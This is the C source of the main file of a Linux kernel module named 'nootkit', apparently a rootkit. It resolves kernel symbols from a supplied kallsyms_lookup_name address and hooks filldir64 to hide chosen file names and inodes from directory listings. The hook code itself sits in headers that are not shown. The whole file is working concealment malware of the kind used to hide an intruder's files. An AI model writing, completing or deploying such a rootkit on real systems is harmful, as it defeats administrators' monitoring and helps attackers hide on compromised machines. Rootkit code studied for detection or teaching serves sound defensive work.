#include <linux/module.h>
#include <linux/moduleparam.h>
#include <linux/kernel.h>
#include <linux/init.h>

#include "license.h"
#include "ksyms.h"
#include "config.h"
#include "hide/readdir.h"

static unsigned long kallsyms_lookup_name_addr;
module_param_named(kallsyms_lookup_name, kallsyms_lookup_name_addr, ulong, 0);

char *hide_filenames[MAX_HIDE_ENTITIES];
int hide_filenames_count;
module_param_array(hide_filenames, charp, &hide_filenames_count, 0);

unsigned long hide_inodes[MAX_HIDE_ENTITIES];
int hide_inodes_count;
module_param_array(hide_inodes, ulong, &hide_inodes_count, 0);

int nootkit_init(void) {
    printk(KERN_INFO "Initializing nootkit!\n");

    resolve_ksyms((void *)kallsyms_lookup_name_addr);

    hide_hook_set_filldir64();

    return 0;
}

void nootkit_exit(void) {
    hide_hook_unset_filldir64();

    printk(KERN_INFO "Unloaded nootkit!\n");
}

module_init(nootkit_init);
module_exit(nootkit_exit);
